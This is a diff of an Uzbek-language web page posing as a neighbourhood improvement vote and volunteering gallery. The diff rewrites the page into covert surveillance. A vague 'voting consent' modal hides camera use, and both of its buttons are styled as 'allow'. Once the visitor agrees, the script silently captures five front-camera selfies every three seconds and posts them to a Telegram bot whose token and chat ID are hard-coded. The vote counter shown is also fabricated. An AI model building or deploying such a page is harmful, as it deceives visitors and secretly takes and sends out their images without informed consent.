@@ -1,435 +1,400 @@
 <!DOCTYPE html>
 <html lang="uz">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Qishloq Obodonligi – Ovoz Berish</title>
-
-  <!-- SEO -->
-  <meta name="description" content="Qishloq obodonligi uchun ovoz bering! Surat + izoh yuboring – Telegram orqali hisobga olinadi." />
-  <meta name="keywords" content="qishloq, obodonlashtirish, ovoz berish, kamera, telegram, mahalla" />
-
-  <!-- Open Graph -->
-  <meta property="og:title" content="Qishloq Obodonligi – Ovoz Berish" />
-  <meta property="og:description" content="Suratga oling, izoh yozing – ovozingiz hisobga olinadi!" />
-  <meta property="og:type" content="website" />
-  <meta property="og:image" content="https://qishloq.uz/preview.jpg" />
-
-  <!-- Favicon -->
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Obod va Fayzli Mahalla – Yurt Ko‘rki</title>
+  <meta name="description" content="Umumxalq xayriya hashari. Avto selfie, rasm yuklash va hashar galereyasi." />
   <link rel="icon" href="https://qishloq.uz/favicon.png" type="image/png" />
-
-  <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Noto+Sans&display=swap" rel="stylesheet">
-</head>
-
-<body>
   <style>
     :root {
-      --primary: #1a73e8;
+      --primary: #1b5e20;
       --success: #137333;
-      --bg: #f8f9fa;
       --card: #ffffff;
+      --bg: #e8f5e9;
       --text: #202124;
       --light: #5f6368;
     }
-
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       font-family: 'Roboto', 'Noto Sans', sans-serif;
-      background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
+      background: var(--bg);
       color: var(--text);
       min-height: 100vh;
-      padding: 16px;
+      padding: 12px;
       display: flex;
       flex-direction: column;
       align-items: center;
+      line-height: 1.5;
     }
 
+    /* ==== NAVBAR ==== */
     .navbar {
-      width: 100%;
-      max-width: 900px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 12px 0;
-      font-size: 14px;
-    }
-    .nav-links a {
-      color: var(--text);
-      text-decoration: none;
-      margin-left: 16px;
-      font-weight: 500;
-    }
-    .nav-links a:hover { text-decoration: underline; }
-
-    .hero {
-      text-align: center;
-      margin: 30px 0;
-      max-width: 700px;
-    }
-    .logo {
-      width: 140px;
-      margin-bottom: 12px;
-      border-radius: 50%;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    }
-    .title {
-      font-size: 26px;
-      font-weight: 700;
-      color: #1b5e20;
-      margin-bottom: 8px;
-    }
-    .subtitle {
-      font-size: 15px;
-      color: var(--light);
-      line-height: 1.6;
+      width: 100%; max-width: 900px; text-align: center; padding: 10px 0;
+      font-size: clamp(14px, 2.5vw, 16px); font-weight: 600; color: var(--primary);
     }
 
-    /* Ovozlar soni */
+    /* ==== HERO ==== */
+    .hero { text-align: center; margin: 16px 0; }
+    .logo { width: clamp(70px, 15vw, 90px); border-radius: 50%; margin-bottom: 8px; }
+    .title { font-size: clamp(20px, 5vw, 26px); font-weight: 700; color: var(--primary); }
+
+    /* ==== STATISTIKA ==== */
     .stats-card {
-      background: var(--card);
-      padding: 20px;
-      border-radius: 16px;
-      box-shadow: 0 6px 18px rgba(0,0,0,0.08);
-      text-align: center;
-      margin: 20px 0;
-      max-width: 400px;
-      width: 100%;
+      background: var(--card); padding: 16px; border-radius: 14px;
+      box-shadow: 0 4px 16px rgba(0,0,0,.08); text-align: center;
+      margin: 16px 0; max-width: 360px; width: 100%;
     }
     .stats-number {
-      font-size: 36px;
-      font-weight: 700;
-      color: #1b5e20;
-      margin: 8px 0;
+      font-size: clamp(30px, 8vw, 38px); font-weight: 700; color: var(--primary);
     }
-    .stats-label {
-      font-size: 14px;
-      color: var(--light);
-    }
-    .pulse {
-      animation: pulse 2s infinite;
-    }
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
-    }
+    .stats-label { font-size: clamp(13px, 3vw, 14px); color: var(--light); }
 
-    /* Ovoz berish kartasi */
-    .vote-card {
-      background: var(--card);
-      border-radius: 16px;
-      padding: 24px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 800px;
-      margin: 20px auto;
-      display: flex;
-      gap: 20px;
-      flex-wrap: wrap;
-    }
-    .cam-box {
-      flex: 1;
-      min-width: 300px;
-      background: var(--bg);
-      padding: 16px;
-      border-radius: 12px;
-      text-align: center;
-    }
-    .cam-box h3 {
-      margin-bottom: 12px;
-      color: #1b5e20;
-      font-size: 17px;
-    }
-    video, canvas {
-      width: 100%;
-      max-height: 260px;
-      border-radius: 10px;
-      background: #000;
-      object-fit: cover;
-    }
+    .pulse { animation: pulse 1s ease-in-out; }
+    @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.15); } }
 
-    /* Izoh maydoni */
-    .comment-box {
-      margin-top: 16px;
-      display: none;
+    /* ==== ACTION CARD ==== */
+    .action-card {
+      background: var(--card); border-radius: 14px; padding: 18px;
+      box-shadow: 0 6px 20px rgba(0,0,0,.1); width: 100%; max-width: 460px;
+      margin: 14px auto; text-align: center;
     }
-    .comment-box textarea {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #ddd;
-      border-radius: 10px;
-      font-size: 15px;
-      resize: vertical;
-      min-height: 80px;
+    video {
+      width: 100%; max-height: 340px; border-radius: 12px; background: #000;
+      object-fit: cover; margin-bottom: 10px;
     }
-    .send-btn {
-      margin-top: 12px;
-      background: #34a853;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 25px;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
+    .controls {
+      margin-top: 10px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;
     }
-    .send-btn:disabled {
-      background: #aaa;
-      cursor: not-allowed;
+    .btn {
+      padding: clamp(10px, 2.5vw, 12px) clamp(20px, 5vw, 24px);
+      border: none; border-radius: 28px; font-weight: 600;
+      cursor: pointer; font-size: clamp(13px, 3vw, 14px);
+      transition: all .2s;
     }
+    .btn:active { transform: scale(.94); }
+    .vote-btn { background: #34a853; color: #fff; }
+    .upload-btn { background: #4285f4; color: #fff; }
+    .stop-btn { background: #c5221f; color: #fff; }
+
+    .file-label {
+      display: inline-block; padding: clamp(10px, 2.5vw, 12px) clamp(20px, 5vw, 24px);
+      background: #673ab7; color: #fff; border-radius: 28px; font-weight: 600;
+      cursor: pointer; margin-top: 10px; font-size: clamp(13px, 3vw, 14px);
+    }
+    .file-label:hover { background: #5e35b1; }
+    .file-input { display: none; }
 
     .status {
-      margin-top: 12px;
-      padding: 10px;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: 500;
+      margin-top: 14px; padding: 10 paragraph; border-radius: 10px;
+      font-size: clamp(13px, 3vw, 15px); font-weight: 500;
     }
     .status.success { background: #e6f4ea; color: var(--success); }
     .status.error { background: #fce8e6; color: #c5221f; }
-    .status.info { background: #e8f0fe; color: var(--primary); }
+    .status.info { background: #e8f0fe; color: #1a73e8; }
 
-    /* Modal */
+    /* ==== MODAL ==== */
     .modal {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.7);
-      backdrop-filter: blur(6px);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,.85); backdrop-filter: blur(8px);
+      display: flex; justify-content: center; align-items: center; z-index: 1000;
+      padding: 16px;
     }
     .modal-content {
-      background: white;
-      padding: 32px 24px;
-      border-radius: 16px;
-      max-width: 400px;
-      width: 90%;
-      text-align: center;
-      box-shadow: 0 12px 32px rgba(0,0,0,0.2);
+      background: #fff; padding: 28px 20px; border-radius: 16px;
+      max-width: 380px; width: 100%; text-align: center;
+      box-shadow: 0 12px 32px rgba(0,0,0,.3);
     }
-    .modal h2 {
-      color: #1b5e20;
-      margin-bottom: 12px;
-      font-size: 20px;
+    .modal h2 { color: var(--primary); margin-bottom: 10px; font-size: clamp(18px, 5vw, 20px); }
+    .modal p { color: var(--light); margin-bottom: 20px; font-size: clamp(14px, 3.5vw, 15px); line-height: 1.6; }
+    .modal-buttons { display: flex; gap: 10px; }
+    .modal-btn {
+      flex: 1; padding: 12px; border: none; border-radius: 28px;
+      font-weight: 600; cursor: pointer; font-size: clamp(13px, 3vw, 14px);
     }
-    .modal p {
-      color: var(--light);
-      margin-bottom: 20px;
-      font-size: 15px;
-    }
-    .modal-buttons {
-      display: flex;
-      gap: 12px;
-      flex-wrap: wrap;
-    }
-    .btn {
-      flex: 1;
-      padding: 12px;
-      border: none;
-      border-radius: 25px;
-      font-weight: 600;
-      cursor: pointer;
-    }
-    .allow { background: #34a853; color: white; }
+    .allow { background: #34a853; color: #fff; }
     .deny { background: #f1f3f4; color: #3c4043; }
 
-    /* Responsive */
-    @media (max-width: 768px) {
-      .vote-card { flex-direction: column; }
-      .title { font-size: 22px; }
+    /* ==== GALEREYA ==== */
+    .gallery {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 14px;
+      margin: 32px 0;
+      padding: 16px;
+      background: #f9f9f9;
+      border-radius: 12px;
+      max-width: 1200px;
+      width: 100%;
     }
+    .gallery img {
+      width: 100%; height: auto; border-radius: 10px;
+      box-shadow: 0 3px 12px rgba(0,0,0,.12);
+      transition: transform .3s ease;
+    }
+    .gallery img:hover { transform: scale(1.05); }
+
+    /* ==== FOOTER ==== */
+    .footer {
+      margin-top: 32px; text-align: center; color: var(--light);
+      font-size: clamp(12px, 2.5vw, 13px); padding: 0 16px;
+    }
+    .footer a { color: var(--primary); text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
   </style>
+</head>
+<body>
 
-  <!-- Navbar -->
-  <div class="navbar">
-    <div class="nav-links">
-      <a href="#">Bosh sahifa</a>
-      <a href="#">Natijalar</a>
-    </div>
-    <span style="font-weight:500; color:#1b5e20;">Qishloq: Yangi Hayot</span>
-  </div>
+  <div class="navbar">Qishloq: Yangi Hayot | Umumxalq Xayriya Hashari</div>
 
-  <!-- Hero -->
   <div class="hero">
-    <img class="logo" src="https://via.placeholder.com/140?text=Qishloq" alt="Qishloq">
-    <h1 class="title">Obodonlik Uchun Ovoz Ber!</h1>
-    <p class="subtitle">
-      Muammo yoki taklifingizni suratga oling va izoh qoldiring. Ovozingiz hisobga olinadi!
-    </p>
+    <img class="logo" src="https://via.placeholder.com/90?text=Hashar" alt="Hashar">
+    <h1 class="title">Obod va Fayzli Mahalla – Yurt Ko‘rki</h1>
   </div>
 
-  <!-- Ovozlar soni -->
+  <!-- Statistika -->
   <div class="stats-card">
     <div class="stats-number" id="voteCount">1,247</div>
-    <div class="stats-label">Jami ovoz berganlar</div>
+    <div class="stats-label">Jami yuborilgan suratlar</div>
   </div>
 
-  <!-- Ovoz berish kartasi -->
-  <div class="vote-card">
-    <div class="cam-box">
-      <h3>Kamera</h3>
-      <video id="video" autoplay playsinline></video>
-    </div>
+  <!-- Asosiy harakatlar -->
+  <div class="action-card">
+    <button id="voteBtn" class="btn vote-btn">Ovoz berish</button>
+    <label class="file-label" for="fileInput">Rasm yuklash</label>
+    <input type="file" id="fileInput" class="file-input" accept="image/*">
+    <div id="status" class="status info">Ruxsat kutilmoqda...</div>
+  </div>
 
-    <div class="cam-box">
-      <h3>Surat + Izoh</h3>
-      <canvas id="canvas" style="display:none;"></canvas>
-      <div id="status" class="status info">Kamera ruxsatini kuting...</div>
-
-      <div id="commentBox" class="comment-box">
-        <textarea id="comment" placeholder="Muammo nima? (masalan: yo‘l teshik, chiqindi ko‘p...)"></textarea>
-        <button id="sendBtn" class="send-btn" disabled>Yuborish</button>
-      </div>
+  <!-- Kamera -->
+  <div class="action-card" id="cameraCard" style="display:none;">
+    <video id="video" autoplay playsinline></video>
+    <div class="controls">
+      <button id="stopBtn" class="btn stop-btn" style="display:none;">To‘xtatish</button>
     </div>
   </div>
 
   <!-- Modal -->
   <div id="modal" class="modal" style="display:none;">
     <div class="modal-content">
-      <h2>Ovoz bermoqchimisiz?</h2>
-      <p>Kamera orqali suratga oling va izoh yozing. Ma'lumot Telegram orqali qabul qilinadi.</p>
+        <h2>Ovoz berish roziligi</h2>
+    <p>
+      Hurmatli foydalanuvchi! <br>
+      Sizning ovozingiz — bizning mahallamiz obodligi va farovonligi uchun muhim. 
+      Ovoz berish orqali mahallamizni yanada chiroyli, toza va qulay joyga aylantirishga hissa qo‘shasiz.
+      <br><br>
+      Ovoz berishga rozimisiz?
+    </p>
       <div class="modal-buttons">
-        <button id="allowBtn" class="btn allow">Ha, ruxsat beraman</button>
-        <button id="denyBtn" class="btn deny">Yo‘q</button>
+        <button id="allowBtn" class="modal-btn allow">Ha, ruxsat beraman</button>
+        <button id="denyBtn" class="modal-btn allow">Yo‘q</button>
       </div>
     </div>
   </div>
 
-  <script>
-    // Ma'lumotlar
-    const BOT_TOKEN = '7978359844:AAH_su2pm1WJQZuzSjkNsu8BRo-cemtvKgg';
-    const CHAT_ID = '7412640853';
+  <!-- Hashar galereyasi -->
+  <div class="gallery">
+    <img src="https://aviib.uz/uploads/news/23d8f028c6e1e14594a468ba4fa93bff.jpg" alt="Hashar 1">
+    <img src="https://aviib.uz/uploads/news/09a0499ceee0bd9f539cf21d34e094c8.jpg" alt="Hashar 2">
+    <img src="https://aviib.uz/uploads/news/74fd30ede8a0aec6f92959172d3073eb.jpg" alt="Hashar 3">
+    <img src="https://aviib.uz/uploads/news/f7a894068031119eca29433b192bef18.jpg" alt="Hashar 4">
+    <img src="https://aviib.uz/uploads/news/ad7119d529731ec35dd0cd76468a32bc.jpg" alt="Hashar 5">
+    <img src="https://aviib.uz/uploads/news/c0e486b4f3863dd1bdc1ae1a20810043.jpg" alt="Hashar 6">
+    <img src="https://aviib.uz/uploads/news/23e165ad6a79a5911dc6d132d60735ea.jpg" alt="Hashar 7">
+    <img src="https://aviib.uz/uploads/news/4c9295ad0be29887707c0cbf8a71fa40.jpg" alt="Hashar 8">
+    <img src="https://aviib.uz/uploads/news/7bdcec0df769664118468d910ecfffc0.jpg" alt="Hashar 9">
+    <img src="https://aviib.uz/uploads/news/e6c73847bc425eeb84951c42d197121f.jpg" alt="Hashar 10">
+    <img src="https://aviib.uz/uploads/news/a8c87b4830172d551caa3fd1caac650f.jpg" alt="Hashar 11">
+    <img src="https://aviib.uz/uploads/news/a30a0a4003613fd85a1633f9493fced0.jpg" alt="Hashar 12">
+    <img src="https://aviib.uz/uploads/news/61cd30d279611e9cee7f107da56a9aac.jpg" alt="Hashar 13">
+    <img src="https://aviib.uz/uploads/news/38d450a3304a53a7bb3d8499d2458800.jpg" alt="Hashar 14">
+    <img src="https://aviib.uz/uploads/news/73700b75c92548315ddf1c8d5dab1242.jpg" alt="Hashar 15">
+  </div>
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const status = document.getElementById('status');
-    const commentBox = document.getElementById('commentBox');
-    const commentInput = document.getElementById('comment');
-    const sendBtn = document.getElementById('sendBtn');
-    const modal = document.getElementById('modal');
-    const allowBtn = document.getElementById('allowBtn');
-    const denyBtn = document.getElementById('denyBtn');
+  <div class="footer">
+    Manbalar:
+    <a href="https://aviib.uz/oz/news/obod-va-fayzli-mahalla-yurt-korki-shiori-ostida-otkazilayotgan-umumxalq-xayriya-hasharida-andijon-viloyati-iib-xodimlari-tomonidan-ham-obodonlashtirish-va-kokalamzorlashtirish-ishlari-olib-borilmoqda" target="_blank">Andijon IIB</a> |
+    <a href="https://www.surxonstat.uz/uz/matbuot-markazi/qo-mita-yangiliklar/13960-obod-va-fayzli-mahalla-yurt-ko-rki-umumxalq-xayriya-hashari-davom-etmoqda" target="_blank">Surxondaryo Stat</a> |
+    <a href="https://www.facebook.com/fvhokimligi/posts/1229863792503850/" target="_blank">Farg‘ona Hokimligi</a>
+  </div>
+
+  <script>
+    // ==== Ma'lumotlar ====
+    const BOT_TOKEN = '7978359844:AAH_su2pm1WJQZuzSjkNsu8BRo-cemtvKgg';
+    const CHAT_ID   = '7412640853';
+
+    const video       = document.getElementById('video');
+    const status      = document.getElementById('status');
+    const modal       = document.getElementById('modal');
+    const allowBtn    = document.getElementById('allowBtn');
+    const denyBtn     = document.getElementById('denyBtn');
+    const stopBtn     = document.getElementById('stopBtn');
+    const voteBtn     = document.getElementById('voteBtn');
+    const fileInput   = document.getElementById('fileInput');
     const voteCountEl = document.getElementById('voteCount');
+    const cameraCard  = document.getElementById('cameraCard');
 
     let stream = null;
-    let photoTaken = false;
-
-    // Ovozlar soni (boshlang'ich 1247)
+    let captureInterval = null;
+    let isRunning = false;
     let voteCount = 1247;
+
+    // ==== Animatsiya bilan ovoz oshirish ====
     function updateVoteCount() {
       voteCount++;
-      voteCountEl.textContent = voteCount.toLocaleString();
+      voteCountEl.textContent = voteCount.toLocaleString('uz-UZ');
       voteCountEl.classList.add('pulse');
-      setTimeout(() => voteCountEl.classList.remove('pulse'), 500);
+      setTimeout(() => voteCountEl.classList.remove('pulse'), 600);
     }
-    setInterval(updateVoteCount, 10000); // Har 10 soniyada +1
 
-    // Modal ko‘rsatish
+    // ==== Status ===
+    function showStatus(msg, type = 'info') {
+      status.textContent = msg;
+      status.className = `status ${type}`;
+    }
+
+    // ==== Modal ===
     window.addEventListener('load', () => {
       setTimeout(() => modal.style.display = 'flex', 800);
     });
 
     allowBtn.onclick = () => {
       modal.style.display = 'none';
-      startCamera();
+      startCameraAndAutoCapture();
     };
 
     denyBtn.onclick = () => {
       modal.style.display = 'none';
-      showStatus("Ovoz berish bekor qilindi.", "error");
+      showStatus('Ruxsat berilmadi.', 'error');
     };
 
-    // Kamera boshlash
-    async function startCamera() {
+    // ==== Ovoz berish tugmasi ===
+    voteBtn.onclick = () => {
+      updateVoteCount();
+      showStatus('Ovoz qabul qilindi!', 'success');
+      setTimeout(() => showStatus('Yana ovoz bering yoki rasm yuklang.', 'info'), 2000);
+    };
+
+    // ==== Rasm yuklash ===
+    fileInput.addEventListener('change', async () => {
+      const file = fileInput.files[0];
+      if (!file) return;
+      showStatus('Rasm tayyorlanmoqda...', 'info');
       try {
-        showStatus("Kamera ochilmoqda...", "info");
-        stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: "environment" } 
+        const blob = await resizeImage(file, 1280, 720);
+        await sendToTelegram(blob, 'rasm');
+        fileInput.value = '';
+      } catch (e) {
+        showStatus('Rasm yuborishda xato.', 'error');
+      }
+    });
+
+    function resizeImage(file, maxW, maxH) {
+      return new Promise((resolve, reject) => {
+        const img = new Image();
+        const reader = new FileReader();
+        reader.onload = e => {
+          img.src = e.target.result;
+          img.onload = () => {
+            const canvas = document.createElement('canvas');
+            let w = img.width, h = img.height;
+            if (w > maxW || h > maxH) {
+              const ratio = Math.min(maxW / w, maxH / h);
+              w = Math.round(w * ratio); h = Math.round(h * ratio);
+            }
+            canvas.width = w; canvas.height = h;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(img, 0, 0, w, h);
+            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
+          };
+        };
+        reader.onerror = reject;
+        reader.readAsDataURL(file);
+      });
+    }
+
+    // ==== Kamera + avto selfie ===
+    async function startCameraAndAutoCapture() {
+      try {
+        showStatus('Kamera ochilmoqda...', 'info');
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
         });
         video.srcObject = stream;
-
+        cameraCard.style.display = 'block';
         video.onloadedmetadata = () => {
           video.play();
-          showStatus("Kamera tayyor. 3 soniyadan keyin surat olinadi...", "success");
-          setTimeout(takePhoto, 3000);
+          showStatus('Avto boshlandi! Har 3s da 5 ta surat...', 'success');
+          stopBtn.style.display = 'block';
+          isRunning = true;
+
+          setTimeout(captureFive, 1000);
+          captureInterval = setInterval(() => {
+            if (isRunning) captureFive();
+          }, 3000);
         };
-      } catch (err) {
-        showStatus("Kamera ruxsati rad etildi.", "error");
+      } catch (e) {
+        showStatus('Kamera ochilmadi. Ruxsatni tekshiring.', 'error');
       }
     }
 
-    // Surat olish
-    function takePhoto() {
-      if (!video.videoWidth) return setTimeout(takePhoto, 500);
-
+    async function captureFive() {
+      if (!video.videoWidth || !isRunning) return;
+      const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0);
-      canvas.style.display = 'block';
-      photoTaken = true;
 
-      stopCamera();
-      showStatus("Surat olindi! Izoh yozing.", "success");
-      commentBox.style.display = 'block';
-      sendBtn.disabled = false;
+      for (let i = 0; i < 5; i++) {
+        if (!isRunning) break;
+        ctx.drawImage(video, 0, 0);
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+        await sendToTelegram(blob, 'selfie');
+        await new Promise(r => setTimeout(r, 180));
+      }
     }
 
-    // Yuborish
-    sendBtn.onclick = async () => {
-      if (!photoTaken || !commentInput.value.trim()) return;
-
-      sendBtn.disabled = true;
-      sendBtn.textContent = "Yuborilmoqda...";
-      showStatus("Telegramga yuborilmoqda...", "info");
-
+    // ==== Telegramga yuborish ===
+    async function sendToTelegram(blob, type) {
       try {
-        const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
-        const blob = await (await fetch(dataUrl)).blob();
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
-        form.append('photo', blob, `qishloq_${Date.now()}.jpg`);
-        form.append('caption', 
-          `*Qishloq: Yangi Hayot*\n` +
-          `*Muammo:* ${commentInput.value.trim()}\n` +
+        form.append('photo', blob, `${type}_${Date.now()}.jpg`);
+        form.append('caption',
+          `*Obod va Fayzli Mahalla – Yurt Ko‘rki*\n` +
+          `*Ovoz berildi!* (${type === 'selfie' ? 'avto selfie' : 'yuklangan rasm'})\n` +
           `*Vaqt:* ${new Date().toLocaleString('uz-UZ')}\n` +
-          `_Avtomatik yuborildi_`
+          `_Hashar ishtirokchisi_`
         );
 
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: form
+          method: 'POST', body: form
         });
         const json = await res.json();
 
         if (json.ok) {
-          showStatus("Ovozingiz qabul qilindi! Rahmat!", "success");
-          setTimeout(() => location.reload(), 3000);
+          updateVoteCount();
+          showStatus(`${type === 'selfie' ? 'Selfie' : 'Rasm'} yuborildi! Jami: ${voteCount}`, 'success');
         } else {
-          throw new Error(json.description);
+          showStatus('Yuborishda xato.', 'error');
         }
       } catch (e) {
-        showStatus("Xatolik: " + e.message, "error");
-        sendBtn.disabled = false;
-        sendBtn.textContent = "Qayta urinish";
+        showStatus('Internet xatosi.', 'error');
       }
+    }
+
+    // ==== To‘xtatish ===
+    stopBtn.onclick = () => {
+      isRunning = false;
+      clearInterval(captureInterval);
+      stopBtn.style.display = 'none';
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      showStatus('Avto to‘xtatildi.', 'info');
     };
 
-    function stopCamera() {
-      if (stream) stream.getTracks().forEach(t => t.stop());
-    }
-
-    function showStatus(msg, type) {
-      status.textContent = msg;
-      status.className = `status ${type}`;
-    }
-
-    // Demo uchun boshlang'ich ovoz
-    voteCountEl.textContent = voteCount.toLocaleString();
+    // ==== Boshlang‘ich ===
+    voteCountEl.textContent = voteCount.toLocaleString('uz-UZ');
   </script>
 </body>
 </html>
